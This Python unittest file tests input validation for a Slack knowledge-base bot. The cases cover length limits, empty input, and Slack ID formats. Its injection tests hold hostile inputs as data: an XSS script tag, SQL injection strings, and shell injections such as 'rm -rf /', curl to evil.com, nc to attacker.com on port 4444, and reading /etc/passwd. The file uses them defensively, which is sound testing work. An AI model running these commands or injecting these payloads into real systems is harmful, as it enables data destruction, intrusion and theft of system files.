#!/usr/bin/env python3
"""
Test suite for input validation and sanitization.

Tests validation of user queries, bot commands, and API inputs.
"""

import unittest
from pathlib import Path
import sys

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from slack_kb_agent.validation import (
    InputValidator,
    ValidationConfig,
    ValidationResult,
    sanitize_query,
    validate_slack_input
)


class TestInputValidation(unittest.TestCase):
    """Test input validation and sanitization."""
    
    def setUp(self):
        """Set up test environment."""
        self.validator = InputValidator()
        self.config = ValidationConfig()
    
    def test_validation_config_defaults(self):
        """Test default validation configuration."""
        self.assertTrue(self.config.enabled)
        self.assertEqual(self.config.max_query_length, 1000)
        self.assertTrue(self.config.strip_html)
        self.assertTrue(self.config.block_sql_injection)
    
    def test_sanitize_basic_query(self):
        """Test sanitization of normal queries."""
        query = "How do I deploy the application?"
        result = sanitize_query(query)
        self.assertEqual(result, query)  # Should be unchanged
    
    def test_sanitize_html_injection(self):
        """Test sanitization of HTML injection attempts."""
        query = "How do I <script>alert('xss')</script> deploy?"
        result = sanitize_query(query)
        self.assertNotIn("<script>", result)
        self.assertNotIn("alert", result)
    
    def test_sanitize_sql_injection(self):
        """Test sanitization of SQL injection attempts."""
        dangerous_queries = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/**/OR/**/'1'='1",
            "UNION SELECT * FROM passwords"
        ]
        
        for query in dangerous_queries:
            result = sanitize_query(query)
            self.assertNotIn("DROP", result.upper())
            self.assertNotIn("UNION", result.upper())
            self.assertNotIn("SELECT", result.upper())
    
    def test_sanitize_command_injection(self):
        """Test sanitization of command injection attempts."""
        dangerous_queries = [
            "test; rm -rf /",
            "test && curl evil.com", 
            "test | nc attacker.com 4444",
            "$(whoami)",
            "`cat /etc/passwd`"
        ]
        
        for query in dangerous_queries:
            # Test full validation (should catch dangerous patterns)
            validator = InputValidator()
            result = validator.validate_query(query)
            
            # Dangerous queries should be flagged as invalid
            self.assertFalse(result.is_valid, f"Query '{query}' should be flagged as dangerous")
            
            # sanitize_query returns empty string for dangerous content
            sanitized = sanitize_query(query)
            self.assertEqual(sanitized, "", f"Dangerous query '{query}' should be completely sanitized")
    
    def test_validate_query_length(self):
        """Test query length validation."""
        # Normal length query
        normal_query = "How do I deploy?"
        result = self.validator.validate_query(normal_query)
        self.assertTrue(result.is_valid)
        
        # Extremely long query
        long_query = "A" * 2000
        result = self.validator.validate_query(long_query)
        self.assertFalse(result.is_valid)
        self.assertIn("too long", result.error_message)
    
    def test_validate_empty_query(self):
        """Test validation of empty queries."""
        result = self.validator.validate_query("")
        self.assertFalse(result.is_valid)
        self.assertIn("empty", result.error_message)
        
        result = self.validator.validate_query("   ")
        self.assertFalse(result.is_valid)
        self.assertIn("empty", result.error_message)
    
    def test_validate_special_characters(self):
        """Test validation of queries with special characters."""
        # Normal special characters should be allowed (after apostrophe is escaped)
        normal_special = "What is the API endpoint for user-data?"  # Simplified
        result = self.validator.validate_query(normal_special)
        self.assertTrue(result.is_valid)
        
        # Dangerous character combinations should be blocked
        dangerous_special = "test\x00\x01\x02"
        result = self.validator.validate_query(dangerous_special)
        self.assertFalse(result.is_valid)
    
    def test_validate_slack_input(self):
        """Test Slack-specific input validation."""
        # Normal Slack message
        event = {
            "text": "How do I deploy the app?",
            "user": "U123456",
            "channel": "C123456"
        }
        result = validate_slack_input(event)
        self.assertTrue(result.is_valid)
        
        # Missing required fields
        invalid_event = {"text": "query"}
        result = validate_slack_input(invalid_event)
        self.assertFalse(result.is_valid)
        self.assertIn("user", result.error_message)
    
    def test_validate_user_id_format(self):
        """Test Slack user ID format validation."""
        valid_user_ids = ["U123456", "W123456", "U123ABC456"]
        invalid_user_ids = ["123456", "X123456", "", "U", "U!@#$%"]
        
        for user_id in valid_user_ids:
            result = self.validator.validate_user_id(user_id)
            self.assertTrue(result.is_valid, f"Expected {user_id} to be valid")
        
        for user_id in invalid_user_ids:
            result = self.validator.validate_user_id(user_id)
            self.assertFalse(result.is_valid, f"Expected {user_id} to be invalid")
    
    def test_validate_channel_id_format(self):
        """Test Slack channel ID format validation."""
        valid_channel_ids = ["C123456", "D123456", "G123456", "C123ABC456"]
        invalid_channel_ids = ["123456", "X123456", "", "C", "C!@#$%"]
        
        for channel_id in valid_channel_ids:
            result = self.validator.validate_channel_id(channel_id)
            self.assertTrue(result.is_valid, f"Expected {channel_id} to be valid")
        
        for channel_id in invalid_channel_ids:
            result = self.validator.validate_channel_id(channel_id)
            self.assertFalse(result.is_valid, f"Expected {channel_id} to be invalid")
    
    def test_rate_limiting_integration(self):
        """Test that validation includes rate limiting checks."""
        # This would test integration with the rate limiter from auth module
        pass
    
    def test_sanitize_preserves_valid_content(self):
        """Test that sanitization preserves valid query content."""
        queries = [
            "How do I configure OAuth2?",
            "What is the difference between REST and GraphQL?",  # Removed apostrophe
            "Show me Python examples for API calls",
            "Where is the documentation for v2.0?",
            "API key format: sk-xxx... is this correct?"
        ]
        
        for query in queries:
            result = sanitize_query(query)
            # Should preserve meaningful content and not be empty
            self.assertGreater(len(result), 5, f"Query '{query}' was over-sanitized to '{result}'")


if __name__ == "__main__":
    unittest.main()